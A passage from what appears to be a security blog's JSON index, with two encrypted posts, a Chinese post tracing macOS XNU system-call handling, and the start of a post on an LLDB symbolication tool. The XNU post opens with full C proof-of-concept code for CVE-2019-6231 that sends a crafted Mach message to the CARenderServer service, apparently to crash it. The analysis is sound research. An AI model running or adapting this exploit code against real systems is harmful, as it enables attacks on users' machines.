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","tags":[]},{"title":"1amb4ck","date":"2019-03-05T15:26:30.000Z","path":"2019/03/05/1amb4ck/1amb4ck/","text":"Need password to decrypt! Incorrect Password! No content to display! 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","tags":[]},{"title":"XNU系统调用深度解析","date":"2019-01-30T05:53:00.000Z","path":"2019/01/30/XNU系统调用深度解析/XNU系统调用深度解析/","text":"XNU系统调用深度解析 从一个函数分析到系统调用的内核实现 由一段POC而起#include &lt;stdio.h&gt; #include &lt;mach/i386/kern_return.h&gt; #include &lt;mach/mach_traps.h&gt; #include &lt;servers/bootstrap.h&gt; #include &lt;dirent.h&gt; #include &lt;sys/stat.h&gt; #include &lt;time.h&gt; #include &lt;dlfcn.h&gt; #include &lt;unistd.h&gt; typedef struct quartz_register_client_s quartz_register_client_t; struct quartz_register_client_s { mach_msg_header_t header; uint32_t body; mach_msg_port_descriptor_t ports[4]; char padding[12]; }; typedef struct quartzcore_mach_msg quartzcore_mach_msg_t; struct quartzcore_mach_msg{ mach_msg_header_t header; char msg_body[712]; }; uint64_t get_filesize(const char *fn){ struct stat st; stat(fn, &amp;st); uint64_t fsize = st.st_size; return fsize; }; int main(int argc, const char * argv[]) { mach_port_t p = MACH_PORT_NULL, bs_port = MACH_PORT_NULL; task_get_bootstrap_port(mach_task_self(), &amp;bs_port); const char *render_service_name = &quot;com.apple.CARenderServer&quot;; kern_return_t (*bootstrap_look_up)(mach_port_t, const char *, mach_port_t *) = dlsym(RTLD_DEFAULT, &quot;bootstrap_look_up&quot;); kern_return_t kr = bootstrap_look_up(bs_port, render_service_name, &amp;p); if (kr != KERN_SUCCESS) { return -1; } printf(&quot;[*] Get service of %s successully!\\n&quot;, render_service_name); quartz_register_client_t msg_register; memset(&amp;msg_register, 0, sizeof(msg_register)); msg_register.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE) | MACH_MSGH_BITS_COMPLEX; msg_register.header.msgh_remote_port = p; msg_register.header.msgh_local_port = mig_get_reply_port(); msg_register.header.msgh_id = 40202; // _XRegisterClient msg_register.body = 4; msg_register.ports[0].name = mach_task_self(); msg_register.ports[0].disposition = MACH_MSG_TYPE_COPY_SEND; msg_register.ports[0].type = MACH_MSG_PORT_DESCRIPTOR; msg_register.ports[1].name = mach_task_self(); msg_register.ports[1].disposition = MACH_MSG_TYPE_COPY_SEND; msg_register.ports[1].type = MACH_MSG_PORT_DESCRIPTOR; msg_register.ports[2].name = mach_task_self(); msg_register.ports[2].disposition = MACH_MSG_TYPE_COPY_SEND; msg_register.ports[2].type = MACH_MSG_PORT_DESCRIPTOR; msg_register.ports[3].name = mach_task_self(); msg_register.ports[3].disposition = MACH_MSG_TYPE_COPY_SEND; msg_register.ports[3].type = MACH_MSG_PORT_DESCRIPTOR; kr = mach_msg(&amp;msg_register.header, MACH_SEND_MSG | MACH_RCV_MSG, sizeof(quartz_register_client_t), sizeof(quartz_register_client_t), msg_register.header.msgh_local_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL); if (kr != KERN_SUCCESS) { return -1 ; } mach_port_t context_port = *(uint32_t *)((uint8_t *)&amp;msg_register + 0x1c); uint32_t conn_id = *(uint32_t *)((uint8_t *)&amp;msg_register + 0x30); printf(&quot;[*] context_port: 0x%x, conn_id: 0x%x\\n&quot;,context_port,conn_id); char *crash_log = &quot;crash.data&quot;; //size is 736. FILE *fp = fopen(crash_log, &quot;rb&quot;); if(fp == NULL){ printf(&quot;fopen error!\\n&quot;); } uint64_t fsize = get_filesize(crash_log); void *msg_buf = malloc(fsize); memset(msg_buf, 0, fsize); fread(msg_buf, fsize, 1, fp); quartzcore_mach_msg_t qc_mach_msg = {0}; qc_mach_msg.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0) | MACH_MSGH_BITS_COMPLEX; qc_mach_msg.header.msgh_remote_port = context_port; qc_mach_msg.header.msgh_id = 40002; memset(qc_mach_msg.msg_body, 0x0, sizeof(qc_mach_msg.msg_body)); *(uint32_t *)(qc_mach_msg.msg_body + 0) = 0x1; // Ports count memcpy(qc_mach_msg.msg_body+4+12, msg_buf+0x1c+0xc, 736-0x1c-0xc); *(uint32_t *)(qc_mach_msg.msg_body + 4 + 12 + 4) = conn_id; kr = mach_msg(&amp;qc_mach_msg.header, MACH_SEND_MSG,736, 0, 0, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL); if (kr != KERN_SUCCESS) { printf(&quot;[-] Send message failed: 0x%d\\n&quot;, kr); return -1 ; } return 0; } 里面的macho函数mach_msg()到底后面执行到哪里？于是展开一段追踪 从ida的导入表中可以看到这个函数实现在libSystem.B.dylib 顺便说下，这个动态库实际上只是一层封装，里面导入了/usr/lib/system下面的动态库。 * thread #1, queue = &#39;com.apple.main-thread&#39;, stop reason = breakpoint 2.1 frame #0: 0x00007fff79299694 libsystem_kernel.dylib`mach_msg libsystem_kernel.dylib`mach_msg: -&gt; 0x7fff79299694 &lt;+0&gt;: pushq %rbp 0x7fff79299695 &lt;+1&gt;: movq %rsp, %rbp 0x7fff79299698 &lt;+4&gt;: pushq %r15 0x7fff7929969a &lt;+6&gt;: pushq %r14 Target 0: (CVE-2019-6231-poc) stopped. 调试可以看出mach_msg实现在libsystem_kernel.dylib之中 (lldb) dis libsystem_kernel.dylib`mach_msg: -&gt; 0x7fff79299694 &lt;+0&gt;: pushq %rbp 0x7fff79299695 &lt;+1&gt;: movq %rsp, %rbp 0x7fff79299698 &lt;+4&gt;: pushq %r15 0x7fff7929969a &lt;+6&gt;: pushq %r14 0x7fff7929969c &lt;+8&gt;: pushq %r13 0x7fff7929969e &lt;+10&gt;: pushq %r12 0x7fff792996a0 &lt;+12&gt;: pushq %rbx 0x7fff792996a1 &lt;+13&gt;: subq $0x28, %rsp 0x7fff792996a5 &lt;+17&gt;: movl %ecx, %r13d 0x7fff792996a8 &lt;+20&gt;: movl %esi, %ebx 0x7fff792996aa &lt;+22&gt;: movq %rdi, %r14 0x7fff792996ad &lt;+25&gt;: movl 0x10(%rbp), %eax 0x7fff792996b0 &lt;+28&gt;: movl %ebx, %r12d 0x7fff792996b3 &lt;+31&gt;: andl $0xfffffbbf, %r12d ; imm = 0xFFFFFBBF 0x7fff792996ba &lt;+38&gt;: movl %eax, (%rsp) 0x7fff792996bd &lt;+41&gt;: movl %r12d, %esi 0x7fff792996c0 &lt;+44&gt;: movl %edx, %r15d 0x7fff792996c3 &lt;+47&gt;: movl %r8d, -0x2c(%rbp) 0x7fff792996c7 &lt;+51&gt;: movl %r9d, -0x30(%rbp) 0x7fff792996cb &lt;+55&gt;: callq 0x7fff79299170 ; mach_msg_trap ... mach_msg_return_t __cdecl mach_msg(mach_msg_header_t *msg, mach_msg_option_t option, mach_msg_size_t send_size, mach_msg_size_t rcv_size, mach_port_name_t rcv_name, mach_msg_timeout_t timeout, mach_port_name_t notify) { mach_msg_return_t result; // eax mach_msg_option_t v8; // er12 result = mach_msg_trap(); if ( !result ) return 0; if ( !(option &amp; 0x40) &amp;&amp; result == 268435463 ) { do result = mach_msg_trap(); while ( result == 268435463 ); } v8 = option; if ( !_bittest(&amp;v8, 0xAu) &amp;&amp; result == 268451845 ) { do result = mach_msg_trap(); while ( result == 268451845 ); } return result; } 通过调式和ida反汇编mach_msg函数可以看出，最终会调用mach_msg_trap这个函数，再跟一下 * thread #1, queue = &#39;com.apple.main-thread&#39;, stop reason = breakpoint 3.1 frame #0: 0x00007fff79299170 libsystem_kernel.dylib`mach_msg_trap libsystem_kernel.dylib`mach_msg_trap: -&gt; 0x7fff79299170 &lt;+0&gt;: movq %rcx, %r10 0x7fff79299173 &lt;+3&gt;: movl $0x100001f, %eax ; imm = 0x100001F 0x7fff79299178 &lt;+8&gt;: syscall 0x7fff7929917a &lt;+10&gt;: retq Target 0: (CVE-2019-6231-poc) stopped. 这个函数后面会调用0x100001f系统调用，可以小结得到系统库封装了最底层的实现，最终通过系统调用进入内核。在用户层到这里已经就到头了，无法再跟进。 XNU内核系统调用流程系统调用发生在内核之中，那么最开始处理系统调用的地方又在哪？通过intel官方文档可以找到 SYSCALL invokes an OS system-call handler at privilege level 0. It does so by loading RIP from the IA32_LSTAR MSR 也就是内核需要将系统调用处理函数入口放到IA32_LSTAR model specific register. 在内核源码中对应在osfmk/i386/mp_desc.c的cpu_syscall_init(cpu_data_t *cdp)函数之中 /* * Set MSRs for sysenter/sysexit and syscall/sysret for 64-bit. */ void cpu_syscall_init(cpu_data_t *cdp) { #if MONOTONIC mt_cpu_up(cdp); #else /* MONOTONIC */ #pragma unused(cdp) #endif /* !MONOTONIC */ wrmsr64(MSR_IA32_SYSENTER_CS, SYSENTER_CS); wrmsr64(MSR_IA32_SYSENTER_EIP, DBLMAP((uintptr_t) hi64_sysenter)); wrmsr64(MSR_IA32_SYSENTER_ESP, current_cpu_datap()-&gt;cpu_desc_index.cdi_sstku); /* Enable syscall/sysret */ wrmsr64(MSR_IA32_EFER, rdmsr64(MSR_IA32_EFER) | MSR_IA32_EFER_SCE); /* * MSRs for 64-bit syscall/sysret * Note USER_CS because sysret uses this + 16 when returning to * 64-bit code. */ wrmsr64(MSR_IA32_LSTAR, DBLMAP((uintptr_t) hi64_syscall)); wrmsr64(MSR_IA32_STAR, (((uint64_t)USER_CS) &lt;&lt; 48) | (((uint64_t)KERNEL64_CS) &lt;&lt; 32)); /* * Emulate eflags cleared by sysenter but note that * we also clear the trace trap to avoid the complications * of single-stepping into a syscall. The nested task bit * is also cleared to avoid a spurious &quot;task switch&quot; * should we choose to return via an IRET. */ wrmsr64(MSR_IA32_FMASK, EFL_DF|EFL_IF|EFL_TF|EFL_NT); } wrmsr64(MSR_IA32_LSTAR, DBLMAP((uintptr_t) hi64_syscall));也就是系统调用会由hi64_syscall函数处理。这个函数实现在xnu/osfmk/x86_64/idt64.s之中 Entry(hi64_syscall) Entry(idt64_syscall) swapgs /* Use RAX as a temporary by shifting its contents into R11[32:63] * The systemcall number is defined to be a 32-bit quantity, as is * RFLAGS. */ shlq $32, %rax or %rax, %r11 .globl EXT(dblsyscall_patch_point) EXT(dblsyscall_patch_point): // movabsq $0x12345678ABCDEFFFULL, %rax /* Generate offset to the double-mapped per-CPU data shadow * into RAX */ leaq EXT(idt64_hndl_table0)(%rip), %rax mov 16(%rax), %rax mov %rsp, %gs:CPU_UBER_TMP(%rax) /* save user stack */ mov %gs:CPU_ESTACK(%rax), %rsp /* switch stack to per-cpu estack */ sub $(ISF64_SIZE), %rsp /* * Synthesize an ISF frame on the exception stack */ movl $(USER_DS), ISF64_SS(%rsp) mov %rcx, ISF64_RIP(%rsp) /* rip */ mov %gs:CPU_UBER_TMP(%rax), %rcx mov %rcx, ISF64_RSP(%rsp) /* user stack --changed */ mov %r11, %rax shrq $32, %rax /* Restore RAX */ mov %r11d, %r11d /* Clear r11[32:63] */ mov %r11, ISF64_RFLAGS(%rsp) /* rflags */ movl $(SYSCALL_CS), ISF64_CS(%rsp) /* cs - a pseudo-segment */ mov %rax, ISF64_ERR(%rsp) /* err/rax - syscall code */ movq $(HNDL_SYSCALL), ISF64_TRAPFN(%rsp) movq $(T_SYSCALL), ISF64_TRAPNO(%rsp) /* trapno */ swapgs jmp L_dispatch /* this can only be 64-bit */ 继续跟下去，会得到如下执行流程 syscall--&gt;hi64_syscall-&gt;L_dispatch--&gt;ks_dispatch--&gt;ks_dispatch_user--&gt;L_dispatch_U64--&gt; L_dispatch_64bit--&gt;L_common_dispatch--&gt;hndl_syscall /* * 64bit Tasks * System call entries via syscall only: * * r15 x86_saved_state64_t * rsp kernel stack * * both rsp and r15 are 16-byte aligned * interrupts disabled * direction flag cleared */ Entry(hndl_syscall) TIME_TRAP_UENTRY movq %gs:CPU_ACTIVE_THREAD,%rcx /* get current thread */ movl $-1, TH_IOTIER_OVERRIDE(%rcx) /* Reset IO tier override to -1 before handling syscall */ movq TH_TASK(%rcx),%rbx /* point to current task */ /* Check for active vtimers in the current task */ TASK_VTIMER_CHECK(%rbx,%rcx) /* * We can be here either for a mach, unix machdep or diag syscall, * as indicated by the syscall class: */ movl R64_RAX(%r15), %eax /* syscall number/class */ movl %eax, %edx andl $(SYSCALL_CLASS_MASK), %edx /* syscall class */ cmpl $(SYSCALL_CLASS_MACH&lt;&lt;SYSCALL_CLASS_SHIFT), %edx je EXT(hndl_mach_scall64) cmpl $(SYSCALL_CLASS_UNIX&lt;&lt;SYSCALL_CLASS_SHIFT), %edx je EXT(hndl_unix_scall64) cmpl $(SYSCALL_CLASS_MDEP&lt;&lt;SYSCALL_CLASS_SHIFT), %edx je EXT(hndl_mdep_scall64) cmpl $(SYSCALL_CLASS_DIAG&lt;&lt;SYSCALL_CLASS_SHIFT), %edx je EXT(hndl_diag_scall64) /* Syscall class unknown */ sti CCALL3(i386_exception, $(EXC_SYSCALL), %rax, $1) /* no return */ hndl_syscall这个函数会系统调用分为hndl_unix_scall64 、hndl_mach_scall64、hndl_mdep_scall64、hndl_diag_scall64四类分别处理 这里以hndl_unix_scall64为列 Entry(hndl_unix_scall) TIME_TRAP_UENTRY movq %gs:CPU_ACTIVE_THREAD,%rcx /* get current thread */ movq TH_TASK(%rcx),%rbx /* point to current task */ incl TH_SYSCALLS_UNIX(%rcx) /* increment call count */ /* Check for active vtimers in the current task */ TASK_VTIMER_CHECK(%rbx,%rcx) sti CCALL1(unix_syscall, %r15) /* * always returns through thread_exception_return */ 这里调动了unix_syscall函数，这个函数在bsd/dev/i386/systemcalls.c之中实现，里面进行了一些权限检查 以及根据系统调用表去调用对应的实现 thread = current_thread(); uthread = get_bsdthread_info(thread); // regs is derrived from r15 ... code = regs-&gt;rax &amp; SYSCALL_NUMBER_MASK; callp = (code &gt;= NUM_SYSENT) ? &amp;sysent[63] : &amp;sysent[code]; // ... vt = (void *)uthread-&gt;uu_arg; // ... memcpy(vt, args_start_at_rdi ? &amp;regs-&gt;rdi : &amp;regs-&gt;rsi, args_in_regs * sizeof(syscall_arg_t)); // ... error = (*(callp-&gt;sy_call))((void *)p, vt, &amp;(uthread-&gt;uu_rval[0])); 目前执行的流程如下 hi64_syscall L_dispatch_U64 L_dispatch_64bit L_common_dispatch hndl_syscall // rdx, pushed in hi64_syscall hndl_unix_scall64 unix_syscall64 error = (*(callp-&gt;sy_call))((void *)p, vt, &amp;(uthread-&gt;uu_rval[0])); // now we&#39;re there 参考https://www.binss.me/blog/interrupt-and-exception/ https://0xax.gitbooks.io/linux-insides/content/SysCall/linux-syscall-2.html https://gist.github.com/yrp604/23e86dce9ca12bf514ef","tags":[{"name":"XNU","slug":"XNU","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/XNU/"},{"name":"Kernel","slug":"Kernel","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Kernel/"}]},{"title":"LLDB调试器栈符号化","date":"2018-10-03T05:27:59.000Z","path":"2018/10/03/xia0LLDB/xia0LLDB/","text":"强化你的lldb调试器Why?lldb作为苹果iOS和macOS的调试器在正向开发中十分强大，不过对于逆向人员来说却不是很友好。尤其是那些符号表被strip以后的执行文件。去定位追溯一个函数的执行流程时，查看当前的栈帧只有一堆内存地址，如果要定位是哪个函数通常的流程就是找到当前模块的内存偏移，然后栈上的地址逐一减去改偏移然后去ida中查找改地址，最后才能定位到函数名。流程琐碎且都是重复工作，花费大量时间去定位符号信息。因此我想做一个能自动恢复栈帧符号的命令。只要输入改命令就能显示函数的调用情况。 How?但是符号表都已经被strip了怎么才能恢复符号呢？我的想法就是macho可执行文件中其实是有很大一部分段储存的OC函数信息，里面肯定是有类名和方法名的，我们要做的就是通过栈中的地址，遍历所有的类以及方法，找到最佳的类方法即可。判断原则就是找到距离栈地址最近且小于等于栈地址的类方法。然后记录类名和方法名即可。 正好lldb提供了python的接口，可以开发自定义的命令。 And what ?虽然有python接口，但是lldb里面集成了一个OC的解释器，其语法要求特别严格，按照通常开发的写法会有很多错误，经过不断的调试和修复bug，一个开发版基于lldb python栈符号恢复命令开发完成。git地址在这里 